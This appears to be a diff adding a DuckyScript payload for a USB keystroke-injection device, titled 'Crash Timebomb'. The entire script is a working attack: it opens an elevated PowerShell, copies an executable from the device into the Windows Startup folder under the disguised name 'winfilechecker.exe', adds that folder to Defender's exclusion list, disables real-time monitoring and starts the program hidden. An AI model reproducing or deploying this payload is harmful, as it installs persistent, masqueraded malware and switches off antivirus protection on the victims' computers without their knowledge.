@@ -1,0 +1,45 @@
+REM Crash Timebomb
+REM AUTHOR Chase
+REM_BLOCK 
+    DESCRIPTION 
+    This script will inject a custom python script 
+    which will worm into the system and crash the current app before starting again
+END_REM
+
+ATTACKMODE HID STORAGE
+
+WAIT_FOR_BUTTON_PRESS
+DELAY 300
+
+GUI r 
+DELAY 300
+
+STRING powershell
+DELAY 300
+
+CTRL SHIFT ENTER
+DELAY 500
+
+LEFTARROW
+DELAY 100
+
+ENTER
+DELAY 500
+
+REM Copies .exe and plants it in startup folder under new name
+STRINGLN Copy-Item -Path "D:\hangar_bay\ghost_voice.exe" -Destination "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\winfilechecker.exe"
+DELAY 100
+
+REM Adds folder to defenders exlusion list
+STRINGLN Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+DELAY 100
+
+REM Disables defenders active monitoring
+STRINGLN Set-MpPreference -DisableRealTimeMonitoring $true
+DELAY 100
+
+REM Covertly Starts process in the background
+STRINGLN Start-Process -FilePath "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\winfilechecker.exe" -WindowStyle Hidden
+DELAY 100
+
+STRINGLN exit
